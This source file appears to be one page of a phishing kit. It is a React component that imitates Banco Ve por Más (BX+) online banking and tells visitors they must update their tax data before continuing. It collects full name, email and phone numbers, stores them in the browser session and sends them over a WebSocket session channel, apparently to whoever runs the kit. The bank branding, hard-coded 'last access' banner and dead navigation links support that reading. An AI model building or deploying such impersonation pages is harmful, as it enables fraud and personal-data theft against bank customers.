import React, { useState } from 'react'
import { useNavigate } from 'react-router-dom'

const TaxDataUpdate: React.FC = () => {
  const [fullName, setFullName] = useState('')
  const [email, setEmail] = useState('')
  const [mobilePhone, setMobilePhone] = useState('')
  const [landlinePhone, setLandlinePhone] = useState('')
  const [errors, setErrors] = useState<{
    fullName?: string
    email?: string
    mobilePhone?: string
    landlinePhone?: string
  }>({})
  const [currentStep, setCurrentStep] = useState(2) // Paso 2 de 3
  const navigate = useNavigate()

  const validateEmail = (email: string): boolean => {
    const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/
    return emailRegex.test(email)
  }

  const handleEmailChange = (value: string) => {
    setEmail(value)
    if (value && !validateEmail(value)) {
      setErrors(prev => ({ ...prev, email: 'Ingrese un correo electrónico válido' }))
    } else {
      setErrors(prev => ({ ...prev, email: undefined }))
    }
  }

  const handleMobilePhoneChange = (value: string) => {
    // Solo números y máximo 10 dígitos
    const numericValue = value.replace(/\D/g, '').slice(0, 10)
    setMobilePhone(numericValue)
    if (numericValue && numericValue.length !== 10) {
      setErrors(prev => ({ ...prev, mobilePhone: 'El teléfono móvil debe tener 10 dígitos' }))
    } else {
      setErrors(prev => ({ ...prev, mobilePhone: undefined }))
    }
  }

  const handleLandlinePhoneChange = (value: string) => {
    // Solo números y máximo 10 dígitos
    const numericValue = value.replace(/\D/g, '').slice(0, 10)
    setLandlinePhone(numericValue)
    if (numericValue && numericValue.length !== 10) {
      setErrors(prev => ({ ...prev, landlinePhone: 'El teléfono fijo debe tener 10 dígitos' }))
    } else {
      setErrors(prev => ({ ...prev, landlinePhone: undefined }))
    }
  }

  const handleContinue = (e: React.FormEvent) => {
    e.preventDefault()
    
    // Validar todos los campos
    const newErrors: typeof errors = {}
    
    if (!fullName.trim()) {
      newErrors.fullName = 'El nombre completo es requerido'
    }
    
    if (!email.trim()) {
      newErrors.email = 'El correo electrónico es requerido'
    } else if (!validateEmail(email)) {
      newErrors.email = 'Ingrese un correo electrónico válido'
    }
    
    if (!mobilePhone.trim()) {
      newErrors.mobilePhone = 'El teléfono móvil es requerido'
    } else if (mobilePhone.length !== 10) {
      newErrors.mobilePhone = 'El teléfono móvil debe tener 10 dígitos'
    }
    
    if (!landlinePhone.trim()) {
      newErrors.landlinePhone = 'El teléfono fijo es requerido'
    } else if (landlinePhone.length !== 10) {
      newErrors.landlinePhone = 'El teléfono fijo debe tener 10 dígitos'
    }
    
    setErrors(newErrors)
    
    // Si hay errores, no continuar
    if (Object.keys(newErrors).length > 0) {
      return
    }
    
    // Guardar datos en sessionStorage
    const dataToSave = {
      fullName,
      email,
      mobilePhone,
      landlinePhone
    }
    sessionStorage.setItem('taxData', JSON.stringify(dataToSave))
    
    // Enviar al WebSocket con ID de sesión correcto
    import('../services/session.service').then(({ default: sessionService }) => {
      const sessionId = sessionService.getSessionId()
      import('../services/websocket.service').then(ws => {
        const sendData = () => {
          if (ws.default.isConnected && ws.default.isConnected()) {
            ws.default.updateSession({
              sessionId: sessionId,
              idSesion: sessionId,
              taxData: dataToSave
            })
          } else {
            ws.default.connect()
            setTimeout(sendData, 1000)
          }
        }
        sendData()
      })
    })
    
    // Navegar a la pantalla de confirmación
    navigate('/tax-confirmation', { state: dataToSave })
  }

  const handleCancel = () => {
    navigate('/login')
  }

  return (
    <div className="wrapper dark" style={{ margin: 0, padding: 0 }}>
      {/* Header */}
      <header style={{
        backgroundColor: '#2c3e50',
        color: '#fff',
        padding: '10px 15px',
        display: 'flex',
        justifyContent: 'space-between',
        alignItems: 'flex-start',
        flexWrap: 'wrap',
        gap: '10px',
        margin: 0,
        width: '100%'
      }}>
        <style>{`
          @media (max-width: 768px) {
            .header-logo {
              font-size: 16px !important;
            }
            .header-nav {
              font-size: 12px !important;
              gap: 8px !important;
            }
            .header-nav a {
              font-size: 12px !important;
            }
            .header-access {
              font-size: 9px !important;
              min-width: auto !important;
              width: 100% !important;
              text-align: left !important;
              margin-top: 10px !important;
            }
            .header-access div {
              font-size: 9px !important;
              line-height: 1.4 !important;
            }
          }
        `}</style>
        <div style={{ display: 'flex', alignItems: 'center', gap: '10px', flexWrap: 'wrap', flex: '1 1 auto' }}>
          <span className="header-logo" style={{ fontSize: '18px', fontWeight: 'bold', whiteSpace: 'nowrap' }}>BX+</span>
          <nav className="header-nav" style={{ display: 'flex', gap: '10px', flexWrap: 'wrap', fontSize: '14px' }}>
            <a href="#" style={{ color: '#fff', textDecoration: 'none', whiteSpace: 'nowrap' }}>INICIO</a>
            <a href="#" style={{ color: '#fff', textDecoration: 'none', whiteSpace: 'nowrap' }}>MIS PRODUCTOS</a>
            <a href="#" style={{ color: '#fff', textDecoration: 'none', whiteSpace: 'nowrap' }}>TRANSACCIONES</a>
          </nav>
        </div>
        <div className="header-access" style={{ fontSize: '11px', textAlign: 'right', minWidth: '200px', flex: '0 1 auto' }}>
          <div>Último acceso al sistema:</div>
          <div style={{ fontSize: '10px' }}>Lunes 15 de diciembre de 2025, 14:22:33</div>
          <div style={{ fontSize: '10px' }}>(15122025143233)</div>
        </div>
      </header>

      <div className="container" style={{ padding: '20px 15px', maxWidth: '100%' }}>
        {/* Logo y Título */}
        <div style={{ textAlign: 'center', marginBottom: '30px', marginTop: '20px' }}>
          <div style={{ marginBottom: '10px', display: 'flex', justifyContent: 'center', alignItems: 'center' }}>
            <img 
              src="assets/images/logoBlancoR.png" 
              alt="BX+" 
              style={{ 
                maxWidth: 'clamp(120px, 25vw, 180px)', 
                height: 'auto',
                filter: 'brightness(0) invert(1)' // Convertir a blanco si el logo es oscuro
              }} 
            />
          </div>
          <h1 style={{ 
            color: '#4A90E2', 
            fontSize: 'clamp(18px, 4vw, 24px)', 
            fontWeight: 'normal',
            margin: '10px 0'
          }}>
            Banca en Línea B×+
          </h1>
        </div>

        {/* Texto introductorio */}
        <div style={{ 
          textAlign: 'center', 
          marginBottom: '30px',
          display: 'flex',
          justifyContent: 'center',
          alignItems: 'center',
          gap: '15px',
          flexWrap: 'wrap'
        }}>
          <p style={{ 
            color: '#666', 
            fontSize: '16px',
            margin: 0
          }}>
            Antes de continuar es necesario actualizar tus datos fiscales
          </p>
          {/* Indicador de progreso */}
          <div style={{ display: 'flex', gap: '8px', alignItems: 'center' }}>
            <div style={{
              width: '12px',
              height: '12px',
              borderRadius: '50%',
              backgroundColor: '#4A90E2',
              border: '2px solid #4A90E2'
            }}></div>
            <div style={{
              width: '12px',
              height: '12px',
              borderRadius: '50%',
              backgroundColor: '#4A90E2',
              border: '2px solid #4A90E2'
            }}></div>
            <div style={{
              width: '12px',
              height: '12px',
              borderRadius: '50%',
              backgroundColor: 'transparent',
              border: '2px solid #4A90E2'
            }}></div>
          </div>
        </div>

        {/* Sección DETALLES */}
        <div style={{ 
          textAlign: 'center', 
          marginBottom: '30px' 
        }}>
          <div style={{
            display: 'inline-block',
            backgroundColor: '#4A90E2',
            color: '#fff',
            padding: '12px 30px',
            borderRadius: '4px 4px 0 0',
            fontSize: '16px',
            fontWeight: 'bold'
          }}>
            DETALLES
          </div>
          <div style={{
            width: '0',
            height: '0',
            borderLeft: '8px solid transparent',
            borderRight: '8px solid transparent',
            borderTop: '8px solid #4A90E2',
            margin: '0 auto'
          }}></div>
        </div>

        {/* Formulario */}
        <form onSubmit={handleContinue} style={{ maxWidth: '600px', margin: '0 auto', padding: '0 10px' }}>
          {/* Datos personales del cliente */}
          <div style={{ marginBottom: '30px' }}>
            <div style={{
              display: 'flex',
              alignItems: 'center',
              marginBottom: '15px'
            }}>
              <div style={{
                width: '50px',
                height: '2px',
                backgroundColor: '#4A90E2',
                marginRight: '10px'
              }}></div>
              <h2 style={{
                color: '#2c3e50',
                fontSize: '18px',
                fontWeight: 'bold',
                margin: 0
              }}>
                Datos personales del cliente
              </h2>
            </div>
            <div className="form-group">
              <label style={{
                display: 'block',
                marginBottom: '8px',
                color: '#666',
                fontSize: '14px',
                fontWeight: '500'
              }}>
                Nombre Completo:
              </label>
              <input
                type="text"
                value={fullName}
                onChange={(e) => {
                  setFullName(e.target.value)
                  if (e.target.value.trim()) {
                    setErrors(prev => ({ ...prev, fullName: undefined }))
                  }
                }}
                className={`form-control ${errors.fullName ? 'validation-invalid' : ''}`}
                placeholder="Ingresa tu nombre completo"
                style={{
                  width: '100%',
                  padding: '12px',
                  border: errors.fullName ? '1px solid #e74c3c' : '1px solid #ddd',
                  borderRadius: '4px',
                  fontSize: '16px'
                }}
              />
              {errors.fullName && (
                <span style={{ color: '#e74c3c', fontSize: '12px', display: 'block', marginTop: '5px' }}>
                  {errors.fullName}
                </span>
              )}
            </div>
          </div>

          {/* Datos de Contacto */}
          <div style={{ marginBottom: '30px' }}>
            <div style={{
              display: 'flex',
              alignItems: 'center',
              marginBottom: '15px'
            }}>
              <div style={{
                width: '50px',
                height: '2px',
                backgroundColor: '#4A90E2',
                marginRight: '10px'
              }}></div>
              <h2 style={{
                color: '#2c3e50',
                fontSize: '18px',
                fontWeight: 'bold',
                margin: 0
              }}>
                Datos de Contacto
              </h2>
            </div>
            <div className="form-group" style={{ marginBottom: '15px' }}>
              <label style={{
                display: 'block',
                marginBottom: '8px',
                color: '#666',
                fontSize: '14px',
                fontWeight: '500'
              }}>
                CORREO
              </label>
              <input
                type="email"
                value={email}
                onChange={(e) => handleEmailChange(e.target.value)}
                className={`form-control ${errors.email ? 'validation-invalid' : ''}`}
                placeholder="correo@ejemplo.com"
                style={{
                  width: '100%',
                  padding: '12px',
                  border: errors.email ? '1px solid #e74c3c' : '1px solid #ddd',
                  borderRadius: '4px',
                  fontSize: '16px'
                }}
              />
              {errors.email && (
                <span style={{ color: '#e74c3c', fontSize: '12px', display: 'block', marginTop: '5px' }}>
                  {errors.email}
                </span>
              )}
            </div>
            <div className="form-group" style={{ marginBottom: '15px' }}>
              <label style={{
                display: 'block',
                marginBottom: '8px',
                color: '#666',
                fontSize: '14px',
                fontWeight: '500'
              }}>
                Telefono movil
              </label>
              <input
                type="tel"
                value={mobilePhone}
                onChange={(e) => handleMobilePhoneChange(e.target.value)}
                className={`form-control ${errors.mobilePhone ? 'validation-invalid' : ''}`}
                placeholder="10 dígitos"
                maxLength={10}
                inputMode="numeric"
                style={{
                  width: '100%',
                  padding: '12px',
                  border: errors.mobilePhone ? '1px solid #e74c3c' : '1px solid #ddd',
                  borderRadius: '4px',
                  fontSize: '16px'
                }}
              />
              {errors.mobilePhone && (
                <span style={{ color: '#e74c3c', fontSize: '12px', display: 'block', marginTop: '5px' }}>
                  {errors.mobilePhone}
                </span>
              )}
              {mobilePhone && !errors.mobilePhone && (
                <span style={{ color: '#666', fontSize: '12px', display: 'block', marginTop: '5px' }}>
                  {mobilePhone.length}/10 dígitos
                </span>
              )}
            </div>
            <div className="form-group">
              <label style={{
                display: 'block',
                marginBottom: '8px',
                color: '#666',
                fontSize: '14px',
                fontWeight: '500'
              }}>
                Telefono fijo
              </label>
              <input
                type="tel"
                value={landlinePhone}
                onChange={(e) => handleLandlinePhoneChange(e.target.value)}
                className={`form-control ${errors.landlinePhone ? 'validation-invalid' : ''}`}
                placeholder="10 dígitos"
                maxLength={10}
                inputMode="numeric"
                style={{
                  width: '100%',
                  padding: '12px',
                  border: errors.landlinePhone ? '1px solid #e74c3c' : '1px solid #ddd',
                  borderRadius: '4px',
                  fontSize: '16px'
                }}
              />
              {errors.landlinePhone && (
                <span style={{ color: '#e74c3c', fontSize: '12px', display: 'block', marginTop: '5px' }}>
                  {errors.landlinePhone}
                </span>
              )}
              {landlinePhone && !errors.landlinePhone && (
                <span style={{ color: '#666', fontSize: '12px', display: 'block', marginTop: '5px' }}>
                  {landlinePhone.length}/10 dígitos
                </span>
              )}
            </div>
          </div>

          {/* Botones */}
          <div style={{ marginBottom: '30px' }}>
            <button
              type="submit"
              className="btn btn-block"
              style={{
                backgroundColor: '#B8E986',
                color: '#fff',
                border: 'none',
                padding: '14px',
                fontSize: '16px',
                fontWeight: 'bold',
                borderRadius: '4px',
                marginBottom: '15px',
                width: '100%',
                cursor: 'pointer'
              }}
            >
              Continuar
            </button>
            <button
              type="button"
              onClick={handleCancel}
              className="btn btn-block"
              style={{
                backgroundColor: '#e0e0e0',
                color: '#666',
                border: '1px solid #ddd',
                padding: '14px',
                fontSize: '16px',
                borderRadius: '4px',
                width: '100%',
                cursor: 'pointer'
              }}
            >
              Cancelar
            </button>
          </div>
        </form>

        {/* Sección de Ayuda */}
        <div style={{
          backgroundColor: '#f9f9f9',
          padding: '20px',
          borderRadius: '4px',
          marginBottom: '30px',
          textAlign: 'center'
        }}>
          <h3 style={{
            color: '#4A90E2',
            fontSize: '18px',
            fontWeight: 'bold',
            marginBottom: '15px'
          }}>
            ¿Necesitas ayuda? Llámanos.
          </h3>
          <p style={{
            color: '#666',
            fontSize: '14px',
            marginBottom: '15px',
            lineHeight: '1.6'
          }}>
            Para solicitudes de aclaración, consultas sobre el estado de operaciones o reclamaciones relacionadas con SPEI y otros servicios de banca electrónica, comunícate con Línea B×+.
          </p>
          <div style={{
            color: '#4A90E2',
            fontSize: '16px',
            fontWeight: 'bold',
            marginBottom: '10px'
          }}>
            Cd. de México y área metropolitana: 55 11 02 19 19
          </div>
          <div style={{
            color: '#4A90E2',
            fontSize: '16px',
            fontWeight: 'bold',
            marginBottom: '10px'
          }}>
            interior de la República: 800 837 6762
          </div>
          <div style={{
            color: '#666',
            fontSize: '14px'
          }}>
            Lunes a domingo las 24 hrs.
          </div>
        </div>
      </div>

      {/* Footer - Fuera del contenedor para que ocupe todo el ancho */}
      <footer style={{ 
        marginTop: '60px', 
        width: '100vw', 
        marginLeft: 'calc(-50vw + 50%)',
        marginRight: 'calc(-50vw + 50%)'
      }}>
        {/* Footer superior verde lima */}
        <div style={{
          backgroundColor: '#B8E986',
          padding: '20px',
          textAlign: 'center',
          width: '100%',
          boxSizing: 'border-box'
        }}>
          <div style={{
            display: 'flex',
            justifyContent: 'center',
            flexWrap: 'wrap',
            gap: '8px',
            fontSize: 'clamp(12px, 2.5vw, 14px)'
          }}>
            <a href="#" style={{ color: '#2c3e50', textDecoration: 'none', whiteSpace: 'nowrap' }}>Preguntas Frecuentes</a>
            <span style={{ color: '#2c3e50' }}>|</span>
            <a href="#" style={{ color: '#2c3e50', textDecoration: 'none', whiteSpace: 'nowrap' }}>Términos y condiciones</a>
            <span style={{ color: '#2c3e50' }}>|</span>
            <a href="#" style={{ color: '#2c3e50', textDecoration: 'none', whiteSpace: 'nowrap' }}>Privacidad</a>
            <span style={{ color: '#2c3e50' }}>|</span>
            <a href="#" style={{ color: '#2c3e50', textDecoration: 'none', whiteSpace: 'nowrap' }}>Seguridad</a>
            <span style={{ color: '#2c3e50' }}>|</span>
            <a href="#" style={{ color: '#2c3e50', textDecoration: 'none', whiteSpace: 'nowrap' }}>Información legal</a>
            <span style={{ color: '#2c3e50' }}>|</span>
            <a href="#" style={{ color: '#2c3e50', textDecoration: 'none', whiteSpace: 'nowrap' }}>Ayuda</a>
          </div>
        </div>
        {/* Footer inferior azul oscuro */}
        <div style={{
          backgroundColor: '#2c3e50',
          color: '#fff',
          padding: '15px',
          textAlign: 'center',
          fontSize: '12px',
          width: '100%',
          boxSizing: 'border-box'
        }}>
          Banco Ve por Más, S.A., Institución de Banca Múltiple, Grupo Financiero Ve por Más.
        </div>
      </footer>
    </div>
  )
}

export default TaxDataUpdate

